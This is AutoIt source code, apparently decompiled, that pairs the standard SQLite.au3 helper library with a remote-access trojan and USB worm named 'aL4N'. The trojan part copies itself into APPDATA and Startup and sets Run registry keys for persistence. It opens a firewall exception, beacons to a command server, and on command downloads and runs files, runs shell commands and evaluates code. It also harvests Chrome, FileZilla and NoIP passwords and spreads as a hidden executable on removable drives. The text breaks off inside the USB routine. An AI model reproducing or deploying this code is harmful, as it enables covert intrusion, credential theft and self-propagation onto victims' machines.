		Return SetError ( 4 , $ERR , $RET )
	EndIf
	Local $ADATAROW
	$R = _SQLITE_FETCHNAMES ( $HQUERY , $ADATAROW )
	If @error Then
		$ERR = @error
		_SQLITE_QUERYFINALIZE ( $HQUERY )
		Return SetError ( 5 , $ERR , $R )
	EndIf
	$ICOLUMNS = UBound ( $ADATAROW )
	If $ICOLUMNS <= 0 Then
		_SQLITE_QUERYFINALIZE ( $HQUERY )
		Return SetError ( - 1 , 0 , $SQLITE_DONE )
	EndIf
	If Not $FCALLBACK Then
		If $FSWICHDIMENSIONS Then
			Dim $ARESULT [ $ICOLUMNS ] [ $IROWS + 1 ]
			For $I = 0 To $ICOLUMNS - 1
				If $ICHARSIZE > 0 Then
					$ADATAROW [ $I ] = StringLeft ( $ADATAROW [ $I ] , $ICHARSIZE )
				EndIf
				$ARESULT [ $I ] [ 0 ] = $ADATAROW [ $I ]
			Next
		Else
			Dim $ARESULT [ $IROWS + 1 ] [ $ICOLUMNS ]
			For $I = 0 To $ICOLUMNS - 1
				If $ICHARSIZE > 0 Then
					$ADATAROW [ $I ] = StringLeft ( $ADATAROW [ $I ] , $ICHARSIZE )
				EndIf
				$ARESULT [ 0 ] [ $I ] = $ADATAROW [ $I ]
			Next
		EndIf
	Else
		Local $ICBRVAL
		$ICBRVAL = Call ( $SCALLBACK , $ADATAROW )
		If $ICBRVAL = $SQLITE_ABORT Or $ICBRVAL = $SQLITE_INTERRUPT Or @error Then
			$ERR = @error
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			Return SetError ( 7 , $ERR , $ICBRVAL )
		EndIf
	EndIf
	If $IROWS > 0 Then
		For $I = 1 To $IROWS
			$R = _SQLITE_FETCHDATA ( $HQUERY , $ADATAROW , 0 , 0 , $ICOLUMNS )
			If @error Then
				$ERR = @error
				_SQLITE_QUERYFINALIZE ( $HQUERY )
				Return SetError ( 6 , $ERR , $R )
			EndIf
			If $FCALLBACK Then
				$ICBRVAL = Call ( $SCALLBACK , $ADATAROW )
				If $ICBRVAL = $SQLITE_ABORT Or $ICBRVAL = $SQLITE_INTERRUPT Or @error Then
					$ERR = @error
					_SQLITE_QUERYFINALIZE ( $HQUERY )
					Return SetError ( 7 , $ERR , $ICBRVAL )
				EndIf
			Else
				For $J = 0 To $ICOLUMNS - 1
					If $ICHARSIZE > 0 Then
						$ADATAROW [ $J ] = StringLeft ( $ADATAROW [ $J ] , $ICHARSIZE )
					EndIf
					If $FSWICHDIMENSIONS Then
						$ARESULT [ $J ] [ $I ] = $ADATAROW [ $J ]
					Else
						$ARESULT [ $I ] [ $J ] = $ADATAROW [ $J ]
					EndIf
				Next
			EndIf
		Next
	EndIf
	Return ( _SQLITE_QUERYFINALIZE ( $HQUERY ) )
EndFunc
Func _SQLITE_SETTIMEOUT ( $HDB = - 1 , $ITIMEOUT = 1000 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	If IsKeyword ( $ITIMEOUT ) Then $ITIMEOUT = 1000
	Local $AVRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_busy_timeout" , "ptr" , $HDB , "int" , $ITIMEOUT )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $AVRVAL [ 0 ] <> $SQLITE_OK Then SetError ( - 1 )
	Return $AVRVAL [ 0 ]
EndFunc
Func _SQLITE_QUERY ( $HDB , $SSQL , ByRef $HQUERY )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $IRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_prepare16_v2" , "ptr" , $HDB , "wstr" , $SSQL , "int" , - 1 , "long*" , 0 , "long*" , 0 )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $IRVAL [ 0 ] <> $SQLITE_OK Then
		__SQLITE_REPORTERROR ( $HDB , "_SQLite_Query" , $SSQL )
		Return SetError ( - 1 , 0 , $IRVAL [ 0 ] )
	EndIf
	$HQUERY = $IRVAL [ 4 ]
	__SQLITE_HADD ( $__GHQUERYS_SQLITE , $IRVAL [ 4 ] )
	Return $IRVAL [ 0 ]
EndFunc
Func _SQLITE_FETCHDATA ( $HQUERY , ByRef $AROW , $FBINARY = False , $FDONOTFINALIZE = False , $ICOLUMNS = 0 )
	Dim $AROW [ 1 ]
	If __SQLITE_HCHK ( $HQUERY , 7 , False ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	If IsKeyword ( $FBINARY ) Then $FBINARY = False
	If IsKeyword ( $FDONOTFINALIZE ) Then $FDONOTFINALIZE = False
	Local $IRVAL_STEP = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_step" , "ptr" , $HQUERY )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $IRVAL_STEP [ 0 ] <> $SQLITE_ROW Then
		If $FDONOTFINALIZE = False And $IRVAL_STEP [ 0 ] = $SQLITE_DONE Then
			_SQLITE_QUERYFINALIZE ( $HQUERY )
		EndIf
		Return SetError ( - 1 , 0 , $IRVAL_STEP [ 0 ] )
	EndIf
	If Not $ICOLUMNS Then
		Local $IRVAL_COLCNT = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_data_count" , "ptr" , $HQUERY )
		If @error Then Return SetError ( 2 , @error , $SQLITE_MISUSE )
		If $IRVAL_COLCNT [ 0 ] <= 0 Then Return SetError ( - 1 , 0 , $SQLITE_DONE )
		$ICOLUMNS = $IRVAL_COLCNT [ 0 ]
	EndIf
	ReDim $AROW [ $ICOLUMNS ]
	For $I = 0 To $ICOLUMNS - 1
		Local $IRVAL_COLTYPE = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_column_type" , "ptr" , $HQUERY , "int" , $I )
		If @error Then Return SetError ( 4 , @error , $SQLITE_MISUSE )
		If $IRVAL_COLTYPE [ 0 ] = $SQLITE_TYPE_NULL Then
			$AROW [ $I ] = ""
			ContinueLoop
		EndIf
		If ( Not $FBINARY ) And ( $IRVAL_COLTYPE [ 0 ] <> $SQLITE_TYPE_BLOB ) Then
			Local $SRVAL = DllCall ( $G_HDLL_SQLITE , "wstr:cdecl" , "sqlite3_column_text16" , "ptr" , $HQUERY , "int" , $I )
			If @error Then Return SetError ( 3 , @error , $SQLITE_MISUSE )
			$AROW [ $I ] = $SRVAL [ 0 ]
		Else
			Local $VRESULT = DllCall ( $G_HDLL_SQLITE , "ptr:cdecl" , "sqlite3_column_blob" , "ptr" , $HQUERY , "int" , $I )
			If @error Then Return SetError ( 6 , @error , $SQLITE_MISUSE )
			Local $ICOLBYTES = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_column_bytes" , "ptr" , $HQUERY , "int" , $I )
			If @error Then Return SetError ( 5 , @error , $SQLITE_MISUSE )
			Local $VRESULTSTRUCT = DllStructCreate ( "byte[" & $ICOLBYTES [ 0 ] & "]" , $VRESULT [ 0 ] )
			$AROW [ $I ] = Binary ( DllStructGetData ( $VRESULTSTRUCT , 1 ) )
		EndIf
	Next
	Return $SQLITE_OK
EndFunc
Func _SQLITE_CLOSE ( $HDB = - 1 )
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $IRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_close" , "ptr" , $HDB )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $IRVAL [ 0 ] <> $SQLITE_OK Then
		__SQLITE_REPORTERROR ( $HDB , "_SQLite_Close" )
		Return SetError ( - 1 , 0 , $IRVAL [ 0 ] )
	EndIf
	$G_HDB_SQLITE = 0
	__SQLITE_HDEL ( $__GHDBS_SQLITE , $HDB )
	Return $IRVAL [ 0 ]
EndFunc
Func _SQLITE_SAFEMODE ( $FSAFEMODESTATE )
	$__GBSAFEMODESTATE_SQLITE = ( $FSAFEMODESTATE = True )
	Return $SQLITE_OK
EndFunc
Func _SQLITE_QUERYFINALIZE ( $HQUERY )
	If __SQLITE_HCHK ( $HQUERY , 2 , False ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $AVRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_finalize" , "ptr" , $HQUERY )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	__SQLITE_HDEL ( $__GHQUERYS_SQLITE , $HQUERY )
	If $AVRVAL [ 0 ] <> $SQLITE_OK Then SetError ( - 1 )
	Return $AVRVAL [ 0 ]
EndFunc
Func _SQLITE_QUERYRESET ( $HQUERY )
	If __SQLITE_HCHK ( $HQUERY , 2 , False ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $AVRVAL = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_reset" , "ptr" , $HQUERY )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $AVRVAL [ 0 ] <> $SQLITE_OK Then SetError ( - 1 )
	Return $AVRVAL [ 0 ]
EndFunc
Func _SQLITE_FETCHNAMES ( $HQUERY , ByRef $ANAMES )
	Dim $ANAMES [ 1 ]
	If __SQLITE_HCHK ( $HQUERY , 3 , False ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $AVDATACNT = DllCall ( $G_HDLL_SQLITE , "int:cdecl" , "sqlite3_column_count" , "ptr" , $HQUERY )
	If @error Then Return SetError ( 1 , @error , $SQLITE_MISUSE )
	If $AVDATACNT [ 0 ] <= 0 Then Return SetError ( - 1 , 0 , $SQLITE_DONE )
	ReDim $ANAMES [ $AVDATACNT [ 0 ] ]
	Local $AVCOLNAME
	For $ICNT = 0 To $AVDATACNT [ 0 ] - 1
		$AVCOLNAME = DllCall ( $G_HDLL_SQLITE , "wstr:cdecl" , "sqlite3_column_name16" , "ptr" , $HQUERY , "int" , $ICNT )
		If @error Then Return SetError ( 2 , @error , $SQLITE_MISUSE )
		$ANAMES [ $ICNT ] = $AVCOLNAME [ 0 ]
	Next
	Return $SQLITE_OK
EndFunc
Func _SQLITE_QUERYSINGLEROW ( $HDB , $SSQL , ByRef $AROW )
	$AROW = ""
	If __SQLITE_HCHK ( $HDB , 2 ) Then Return SetError ( @error , 0 , $SQLITE_MISUSE )
	Local $HQUERY
	Local $IRVAL = _SQLITE_QUERY ( $HDB , $SSQL , $HQUERY )
	If @error Then
		_SQLITE_QUERYFINALIZE ( $HQUERY )
		Return SetError ( 1 , 0 , $IRVAL )
	Else
		$IRVAL = _SQLITE_FETCHDATA ( $HQUERY , $AROW )
		If $IRVAL = $SQLITE_OK Then
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			If @error Then
				Return SetError ( 4 , 0 , $IRVAL )
			Else
				Return $SQLITE_OK
			EndIf
		Else
			_SQLITE_QUERYFINALIZE ( $HQUERY )
			Return SetError ( 3 , 0 , $IRVAL )
		EndIf
	EndIf
EndFunc
Func _SQLITE_SQLITEEXE ( $SDATABASEFILE , $SINPUT , ByRef $SOUTPUT , $SSQLITEEXEFILENAME = - 1 , $FDEBUG = False )
	If $SSQLITEEXEFILENAME = - 1 Or ( IsKeyword ( $SSQLITEEXEFILENAME ) And $SSQLITEEXEFILENAME = Default ) Then
		$SSQLITEEXEFILENAME = "SQLite3.exe"
		If Not FileExists ( $SSQLITEEXEFILENAME ) Then
			Local $ATEMP = StringSplit ( @AutoItExe , "\" )
			$SSQLITEEXEFILENAME = ""
			For $I = 1 To $ATEMP [ 0 ] - 1
				$SSQLITEEXEFILENAME &= $ATEMP [ $I ] & "\"
			Next
			$SSQLITEEXEFILENAME &= "Extras\SQLite\SQLite3.exe"
		EndIf
	EndIf
	If Not FileExists ( $SDATABASEFILE ) Then
		Local $HNEWFILE = FileOpen ( $SDATABASEFILE , 2 + 8 )
		If $HNEWFILE = - 1 Then
			Return SetError ( 1 , 0 , $SQLITE_CANTOPEN )
		EndIf
		FileClose ( $HNEWFILE )
	EndIf
	Local $SINPUTFILE = _TEMPFILE ( ) , $SOUTPUTFILE = _TEMPFILE ( ) , $IRVAL = $SQLITE_OK
	Local $HINPUTFILE = FileOpen ( $SINPUTFILE , 2 )
	If $HINPUTFILE > - 1 Then
		$SINPUT = ".output stdout" & @CRLF & $SINPUT
		FileWrite ( $HINPUTFILE , $SINPUT )
		FileClose ( $HINPUTFILE )
		Local $SCMD = @ComSpec & " /c " & FileGetShortName ( $SSQLITEEXEFILENAME ) & "  """ & FileGetShortName ( $SDATABASEFILE ) & """ > """ & FileGetShortName ( $SOUTPUTFILE ) & """ < """ & FileGetShortName ( $SINPUTFILE ) & """"
		Local $NERRORLEVEL = RunWait ( $SCMD , @WorkingDir , @SW_HIDE )
		If $FDEBUG = True Then
			Local $NERRORTEMP = @error
			__SQLITE_PRINT ( "@@ Debug(_SQLite_SQLiteExe) : $sCmd = " & $SCMD & @CRLF & ">ErrorLevel: " & $NERRORLEVEL & @CRLF )
			SetError ( $NERRORTEMP )
		EndIf
		If @error = 1 Or $NERRORLEVEL = 1 Then
			$IRVAL = $SQLITE_MISUSE
		Else
			$SOUTPUT = FileRead ( $SOUTPUTFILE , FileGetSize ( $SOUTPUTFILE ) )
			If StringInStr ( $SOUTPUT , "SQL error:" , 1 ) > 0 Or StringInStr ( $SOUTPUT , "Incomplete SQL:" , 1 ) > 0 Then $IRVAL = $SQLITE_ERROR
		EndIf
	Else
		$IRVAL = $SQLITE_CANTOPEN
	EndIf
	If FileExists ( $SINPUTFILE ) Then FileDelete ( $SINPUTFILE )
	Switch $IRVAL
	Case $SQLITE_MISUSE
		SetError ( 2 )
	Case $SQLITE_ERROR
		SetError ( 3 )
	Case $SQLITE_CANTOPEN
		SetError ( 4 )
	EndSwitch
	Return $IRVAL
EndFunc
Func _SQLITE_ENCODE ( $VDATA )
	If IsNumber ( $VDATA ) Then $VDATA = String ( $VDATA )
	If Not IsString ( $VDATA ) And Not IsBinary ( $VDATA ) Then Return SetError ( 1 , 0 , "" )
	Local $VRVAL = "X'"
	If StringLower ( StringLeft ( $VDATA , 2 ) ) = "0x" And Not IsBinary ( $VDATA ) Then
		For $ICNT = 1 To StringLen ( $VDATA )
			$VRVAL &= Hex ( Asc ( StringMid ( $VDATA , $ICNT , 1 ) ) , 2 )
		Next
	Else
		If Not IsBinary ( $VDATA ) Then $VDATA = StringToBinary ( $VDATA , 4 )
		$VRVAL &= Hex ( $VDATA )
	EndIf
	$VRVAL &= "'"
	Return $VRVAL
EndFunc
Func _SQLITE_ESCAPE ( $SSTRING , $IBUFFSIZE = Default )
	If $G_HDLL_SQLITE = 0 Then Return SetError ( 1 , $SQLITE_MISUSE , "" )
	If IsNumber ( $SSTRING ) Then $SSTRING = String ( $SSTRING )
	Local $TSQL8 = __SQLITE_STRINGTOUTF8STRUCT ( $SSTRING )
	If @error Then Return SetError ( 2 , @error , 0 )
	Local $ARVAL = DllCall ( $G_HDLL_SQLITE , "ptr:cdecl" , "sqlite3_mprintf" , "str" , "'%q'" , "struct*" , $TSQL8 )
	If @error Then Return SetError ( 1 , @error , "" )
	If IsKeyword ( $IBUFFSIZE ) Or $IBUFFSIZE < 1 Then $IBUFFSIZE = - 1
	Local $SRESULT = __SQLITE_SZSTRINGREAD ( $ARVAL [ 0 ] , $IBUFFSIZE )
	If @error Then Return SetError ( 3 , @error , "" )
	DllCall ( $G_HDLL_SQLITE , "none:cdecl" , "sqlite3_free" , "ptr" , $ARVAL [ 0 ] )
	Return $SRESULT
EndFunc
Func _SQLITE_FASTENCODE ( $VDATA )
	If Not IsBinary ( $VDATA ) Then Return SetError ( 1 , 0 , "" )
	Return "X'" & Hex ( $VDATA ) & "'"
EndFunc
Func _SQLITE_FASTESCAPE ( $SSTRING )
	If IsNumber ( $SSTRING ) Then $SSTRING = String ( $SSTRING )
	If Not IsString ( $SSTRING ) Then Return SetError ( 1 , 0 , "" )
	Return ( "'" & StringReplace ( $SSTRING , "'" , "''" , 0 , 1 ) & "'" )
EndFunc
#region		SQLite.au3 Internal Functions
Func __SQLITE_HCHK ( ByRef $HGENERIC , $NERROR , $BDB = True )
	If $G_HDLL_SQLITE = 0 Then Return SetError ( 1 , $SQLITE_MISUSE , $SQLITE_MISUSE )
	If $HGENERIC = - 1 Or $HGENERIC = "" Or IsKeyword ( $HGENERIC ) Then
		If Not $BDB Then Return SetError ( $NERROR , 0 , $SQLITE_ERROR )
		$HGENERIC = $G_HDB_SQLITE
	EndIf
	If Not $__GBSAFEMODESTATE_SQLITE Then Return $SQLITE_OK
	If $BDB Then
		If _ARRAYSEARCH ( $__GHDBS_SQLITE , $HGENERIC ) > 0 Then Return $SQLITE_OK
	Else
		If _ARRAYSEARCH ( $__GHQUERYS_SQLITE , $HGENERIC ) > 0 Then Return $SQLITE_OK
	EndIf
	Return SetError ( $NERROR , 0 , $SQLITE_ERROR )
EndFunc
Func __SQLITE_HADD ( ByRef $AHLISTS , $HGENERIC )
	_ARRAYADD ( $AHLISTS , $HGENERIC )
EndFunc
Func __SQLITE_HDEL ( ByRef $AHLISTS , $HGENERIC )
	Local $IELEMENT = _ARRAYSEARCH ( $AHLISTS , $HGENERIC )
	If $IELEMENT > 0 Then _ARRAYDELETE ( $AHLISTS , $IELEMENT )
EndFunc
Func __SQLITE_VERSCMP ( $SFILE , $SVERSION )
	Local $AVRVAL = DllCall ( $SFILE , "str:cdecl" , "sqlite3_libversion" )
	If @error Then Return $SQLITE_CORRUPT
	Local $SZFILEVERSION = StringSplit ( $AVRVAL [ 0 ] , "." )
	Local $MAINTVERSION = 0
	If $SZFILEVERSION [ 0 ] = 4 Then $MAINTVERSION = $SZFILEVERSION [ 4 ]
	$SZFILEVERSION = ( ( $SZFILEVERSION [ 1 ] * 1000 + $SZFILEVERSION [ 2 ] ) * 1000 + $SZFILEVERSION [ 3 ] ) * 100 + $MAINTVERSION
	If $SVERSION < 10000000 Then $SVERSION = $SVERSION * 100
	If $SZFILEVERSION >= $SVERSION Then Return $SQLITE_OK
	Return $SQLITE_MISMATCH
EndFunc
Func __SQLITE_HDBG ( )
	__SQLITE_PRINT ( "State : " & $__GBSAFEMODESTATE_SQLITE & @CRLF )
	Local $ATMP = $__GHDBS_SQLITE
	For $I = 0 To UBound ( $ATMP ) - 1
		__SQLITE_PRINT ( "$__ghDBs_SQLite     -> [" & $I & "]" & $ATMP [ $I ] & @CRLF )
	Next
	$ATMP = $__GHQUERYS_SQLITE
	For $I = 0 To UBound ( $ATMP ) - 1
		__SQLITE_PRINT ( "$__ghQuerys_SQLite  -> [" & $I & "]" & $ATMP [ $I ] & @CRLF )
	Next
EndFunc
Func __SQLITE_REPORTERROR ( $HDB , $SFUNCTION , $SQUERY = Default , $SERROR = Default , $VRETURNVALUE = Default , $CURERR = @error , $CUREXT = @extended )
	If @Compiled Then Return SetError ( $CURERR , $CUREXT )
	If IsKeyword ( $SERROR ) Then $SERROR = _SQLITE_ERRMSG ( $HDB )
	If IsKeyword ( $SQUERY ) Then $SQUERY = ""
	Local $SOUT = "!   SQLite.au3 Error" & @CRLF
	$SOUT &= "--> Function: " & $SFUNCTION & @CRLF
	If $SQUERY <> "" Then $SOUT &= "--> Query:    " & $SQUERY & @CRLF
	$SOUT &= "--> Error:    " & $SERROR & @CRLF
	__SQLITE_PRINT ( $SOUT & @CRLF )
	If Not IsKeyword ( $VRETURNVALUE ) Then Return SetError ( $CURERR , $CUREXT , $VRETURNVALUE )
	Return SetError ( $CURERR , $CUREXT )
EndFunc
Func __SQLITE_SZSTRINGREAD ( $ISZPTR , $IMAXLEN = - 1 )
	If $ISZPTR = 0 Then Return ""
	If $__GHMSVCRTDLL_SQLITE < 1 Then $__GHMSVCRTDLL_SQLITE = DllOpen ( "msvcrt.dll" )
	Local $ASTRLEN = DllCall ( $__GHMSVCRTDLL_SQLITE , "ulong_ptr:cdecl" , "strlen" , "ptr" , $ISZPTR )
	If @error Then Return SetError ( 1 , @error , "" )
	Local $ILEN = $ASTRLEN [ 0 ] + 1
	Local $VSZSTRING = DllStructCreate ( "byte[" & $ILEN & "]" , $ISZPTR )
	If @error Then Return SetError ( 2 , @error , "" )
	Local $ERR = 0
	Local $RTN = __SQLITE_UTF8STRUCTTOSTRING ( $VSZSTRING )
	If @error Then
		$ERR = 3
	EndIf
	If $IMAXLEN <= 0 Then
		Return SetError ( $ERR , @extended , $RTN )
	Else
		Return SetError ( $ERR , @extended , StringLeft ( $RTN , $IMAXLEN ) )
	EndIf
EndFunc
Func __SQLITE_SZFREE ( $PTR , $CURERR = @error )
	If $PTR <> 0 Then DllCall ( $G_HDLL_SQLITE , "none:cdecl" , "sqlite3_free" , "ptr" , $PTR )
	SetError ( $CURERR )
EndFunc
Func __SQLITE_STRINGTOUTF8STRUCT ( $SSTRING )
	Local $ARESULT = DllCall ( "kernel32.dll" , "int" , "WideCharToMultiByte" , "uint" , 65001 , "dword" , 0 , "wstr" , $SSTRING , "int" , - 1 , "ptr" , 0 , "int" , 0 , "ptr" , 0 , "ptr" , 0 )
	If @error Then Return SetError ( 1 , @error , "" )
	Local $TTEXT = DllStructCreate ( "char[" & $ARESULT [ 0 ] & "]" )
	$ARESULT = DllCall ( "Kernel32.dll" , "int" , "WideCharToMultiByte" , "uint" , 65001 , "dword" , 0 , "wstr" , $SSTRING , "int" , - 1 , "struct*" , $TTEXT , "int" , $ARESULT [ 0 ] , "ptr" , 0 , "ptr" , 0 )
	If @error Then Return SetError ( 2 , @error , "" )
	Return $TTEXT
EndFunc
Func __SQLITE_UTF8STRUCTTOSTRING ( $TTEXT )
	Local $ARESULT = DllCall ( "kernel32.dll" , "int" , "MultiByteToWideChar" , "uint" , 65001 , "dword" , 0 , "struct*" , $TTEXT , "int" , - 1 , "ptr" , 0 , "int" , 0 )
	If @error Then Return SetError ( 1 , @error , "" )
	Local $TWSTR = DllStructCreate ( "wchar[" & $ARESULT [ 0 ] & "]" )
	$ARESULT = DllCall ( "Kernel32.dll" , "int" , "MultiByteToWideChar" , "uint" , 65001 , "dword" , 0 , "struct*" , $TTEXT , "int" , - 1 , "struct*" , $TWSTR , "int" , $ARESULT [ 0 ] )
	If @error Then Return SetError ( 2 , @error , "" )
	Return DllStructGetData ( $TWSTR , 1 )
EndFunc
Func __SQLITE_CONSOLEWRITE ( $STEXT )
	ConsoleWrite ( $STEXT )
EndFunc
Func __SQLITE_DOWNLOAD_SQLITE3DLL ( $TEMPFILE , $VERSION )
	Local $URL = "http://www.autoitscript.com/autoit3/files/beta/autoit/archive/sqlite/SQLite3" & $VERSION
	Local $RET
	If @AutoItX64 = 0 Then
		$RET = InetGet ( $URL & ".dll" , $TEMPFILE , 1 )
	Else
		$RET = InetGet ( $URL & "_x64.dll" , $TEMPFILE , 1 )
	EndIf
	Local $ERROR = @error
	FileSetTime ( $TEMPFILE , __SQLITE_INLINE_MODIFIED ( ) , 0 )
	Return SetError ( $ERROR , 0 , $RET )
EndFunc
Func __SQLITE_PRINT ( $STEXT )
	If $G_SPRINTCALLBACK_SQLITE Then
		If $G_BUTF8ERRORMSG_SQLITE Then
			Local $TSTR8 = __SQLITE_STRINGTOUTF8STRUCT ( $STEXT )
			Call ( $G_SPRINTCALLBACK_SQLITE , DllStructGetData ( $TSTR8 , 1 ) )
		Else
			Call ( $G_SPRINTCALLBACK_SQLITE , $STEXT )
		EndIf
	EndIf
EndFunc
#endregion		SQLite.au3 Internal Functions
Func __SQLITE_INLINE_MODIFIED ( )
	Return "20100830083416"
EndFunc
Func __SQLITE_INLINE_VERSION ( )
	Return "300700200"
EndFunc
Opt ( "RunErrorsFatal" , 0 )
Local $HOST = "127.0.0.1"
Local $PORT = 1245
Local $EXE = "aL4N.exe"
Local $DIR = EnvGet ( "appdata" ) & "\"
Local $VR = "0.3.3a"
Local $NAME = "aL4N"
$NAME &= "_" & Hex ( DriveGetSerial ( @HomeDrive ) )
$OS = @OSVersion & " " & @OSArch & " " & StringReplace ( @OSServicePack , "Service Pack " , "SP" )
If StringInStr ( $OS , "SP" ) < 1 Then $OS &= "SP0"
Local $USB = "!"
CUSB ( )
$MELT = 0
$Y = "0njxq80"
$MTX = "appdataaL4N.exe"
$TIMER = 0
$FH = - 1
If $CMDLINE [ 0 ] = 2 Then
	Select
	Case $CMDLINE [ 1 ] = "del"
		If $MELT = - 1 Then
			FileDelete ( $CMDLINE [ 2 ] )
		EndIf
	EndSelect
EndIf
Sleep ( @AutoItPID / 10 )
If _SINGLETON ( $MTX , 1 ) = 0 Then
	Exit
EndIf
If @AutoItExe <> $DIR & $EXE Then
	FileCopy ( @AutoItExe , $DIR & $EXE , 1 )
	ShellExecute ( $DIR & $EXE , """del"" " & @AutoItExe )
	Exit
EndIf
$MEM = ""
$SOCK = - 1
BK ( )
XINS ( )
INS ( )
USBX ( )
$TIME = 0
$AC = ""
$EA = ""
While 1
	$TIME += 1
	If $TIME = 5 Then
		$TIME = 0
		INS ( )
		USB ( )
	EndIf
	If @error Then
	EndIf
	$PK = RC ( )
	If @error Then
	EndIf
	Select
	Case $PK = - 1
		Sleep ( 2000 )
		CN ( )
		SD ( "lv" & $Y & $NAME & $Y & K ( ) & $Y & $OS & $Y & $VR & $Y & $USB & $Y & WinGetTitle ( "" ) )
	Case $PK = ""
		$TIMER += 1
		If $TIMER = 8 Then
			$TIMER = 0
			$EA = WinGetTitle ( "" )
			If $EA <> $AC Then
				SD ( "ac" & $Y & $EA )
			EndIf
			$AC = $EA
			$EA = ""
		EndIf
	Case $PK <> ""
		$A = StringSplit ( $PK , "0njxq80" , 1 )
		If $A [ 0 ] > 0 Then
			Select
			Case $A [ 1 ] = "DL"
				InetGet ( $A [ 2 ] , @TempDir & "\" & $A [ 3 ] , 1 )
				If FileExists ( @TempDir & "\" & $A [ 3 ] ) Then
					ShellExecute ( "cmd.exe" , "/c start %temp%\" & $A [ 3 ] , "" , "" , @SW_HIDE )
					SD ( "MSG" & $Y & "Executed As " & $A [ 3 ] )
				Else
					SD ( "MSG" & $Y & "Download ERR" )
				EndIf
			Case $A [ 1 ] = "up"
				InetGet ( $A [ 2 ] , @TempDir & "\" & $A [ 3 ] , 1 )
				If FileExists ( @TempDir & "\" & $A [ 3 ] ) Then
					ShellExecute ( "cmd.exe" , "/c start %temp%\" & $A [ 3 ] , "" , "" , @SW_HIDE )
					UNS ( )
				EndIf
				SD ( "MSG" & $Y & "Update ERR" )
			Case $A [ 1 ] = "un"
				UNS ( )
			Case $A [ 1 ] = "ex"
				Execute ( $A [ 2 ] )
			Case $A [ 1 ] = "cmd"
				ShellExecute ( "cmd.exe" , $A [ 2 ] , "" , "" , @SW_HIDE )
			Case $A [ 1 ] = "pwd"
				SD ( "PWD" & $Y & NOIP ( ) & CHROME ( ) & FILEZILLA ( ) )
			EndSelect
		EndIf
	EndSelect
	Sleep ( 1000 )
WEnd
Func UNS ( )
	RegDelete ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE )
	RegDelete ( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE )
	FileDelete ( @StartupDir & "\" & $EXE )
	ShellExecute ( "netsh" , "firewall delete allowedprogram " & ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) , "" , "" , @SW_HIDE )
	USBX ( )
	ShellExecute ( @ComSpec , "/k ping 0 & del " & ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) & " & exit" , "" , "" , @SW_HIDE )
	Exit
EndFunc
Func INS ( )
	If RegRead ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE ) <> ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) Then
		RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE , "REG_SZ" , ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) )
	EndIf
	If RegRead ( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE ) <> ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) Then
		RegWrite ( "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" , $EXE , "REG_SZ" , ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) )
	EndIf
	If FileExists ( @StartupDir & "\" & $EXE ) = False Then
		FileCopy ( @AutoItExe , @StartupDir & "\" & $EXE , 1 )
	EndIf
	If @error Then
	EndIf
EndFunc
Func XINS ( )
	EnvSet ( "SEE_MASK_NOZONECHECKS" , "1" )
	ShellExecute ( "netsh" , "firewall add allowedprogram " & ChrW ( 34 ) & @AutoItExe & ChrW ( 34 ) & " " & ChrW ( 34 ) & $EXE & ChrW ( 34 ) & " ENABLE" , "" , "" , @SW_HIDE )
	If @error Then
	EndIf
	FileCopy ( @AutoItExe , @StartupDir & "\" & $EXE , 1 )
	If @error Then
	EndIf
EndFunc
Func USB ( )
	$D = DriveGetDrive ( "REMOVABLE" )
	For $DD = 1 To UBound ( $D ) - 1
		If DriveStatus ( $D [ $DD ] ) = "READY" Then
			If DriveSpaceFree ( $D [ $DD ] ) > 1024 Then
				If FileExists ( $D [ $DD ] & "\My Pictures" ) = False Then DirCreate ( $D [ $DD ] & "\My Pictures" )
				$F = _FILELISTTOARRAY ( $D [ $DD ] , "*.*" , 2 )
				If FileExists ( $D [ $DD ] & "\" & $EXE ) Then
				Else
					FileCopy ( @AutoItExe , $D [ $DD ] & "\" & $EXE )
					FileSetAttrib ( $D [ $DD ] & "\" & $EXE , "+H" )
					$YES = 0
					For $U = 1 To UBound ( $F ) - 1
						$YES = $YES + 1
						If $YES = 10 Then
							$YES = 0
							ExitLoop
						EndIf
